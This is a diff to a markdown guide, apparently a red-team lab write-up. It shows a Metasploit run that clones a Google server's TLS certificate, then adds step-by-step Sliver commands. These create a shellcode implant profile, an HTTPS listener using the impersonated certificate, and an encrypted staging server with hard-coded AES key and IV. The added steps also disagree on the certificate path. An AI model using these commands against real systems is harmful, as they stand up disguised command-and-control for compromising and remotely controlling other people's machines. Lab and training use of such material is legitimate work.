@@ -21,7 +21,7 @@ msf6 auxiliary(gather/impersonate_ssl) > run
 [+] 172.217.21.164:443 - crt: /home/dudu/.msf4/loot/20240703202206_default_172.217.21.164_172.217.21.164_c_797072.crt
 [+] 172.217.21.164:443 - pem: /home/dudu/.msf4/loot/20240703202206_default_172.217.21.164_172.217.21.164_p_382037.pem
 ```
-For further handling, the certificate is copied to `~/Code/certs/` as `crt.crt`, `pem.pem` and `key.key`.
+For further handling, the certificate is copied to `/tmp/certs/` as `crt.crt`, `pem.pem` and `key.key`.
 
 ## Sliver C2 Setup
 
@@ -29,6 +29,21 @@ The chosen Command and Control (C2) framework is [Sliver](https://github.com/Bis
 
 The next steps involve setting up the necessary profile, listener, and stage-listener. It is noted that the IP addresses and paths to assets, such as certificates, need to be adjusted to fit the specific environment.
 
+1. Create a reusable profile for the scenario
+```text
+sliver > profiles new -b https://192.168.8.205:443 --skip-symbols --format shellcode --arch amd64 monkeybox
+```
+2. Start the listener with the same port as specified in the profile and the certificate and key generated from metasploit
+```text
+https -L 192.168.8.205 -l 443 -c /tmp/certs/crt.crt -k /tmp/certs/key.key
+```
+3. Start the stageing server on port 8443 with the HTTPS protocol and the generated certificates. Additional, the the compression algorithm in addition to the AES Encryption Keys has to be passed to the command.
+```text
+sliver > stage-listener --url https://192.168.8.205:8443 --profile monkeybox -c ~/Code/certs/crt.crt -k ~/Code/certs/key.key -C deflate9 --aes-encrypt-key D(G+KbPeShVmYq3t6v9y$B&E)H@McQfT --aes-encrypt-iv 8y/B?E(G+KbPeShV
+```
+4. To confirm that our listeners are running , run the jobs command
+```text
+sliver > jobs
+```
 
-
-
+![Setup Sliver lister and stager](./doc/img/sliver001.png "Setup Sliver lister and stager")
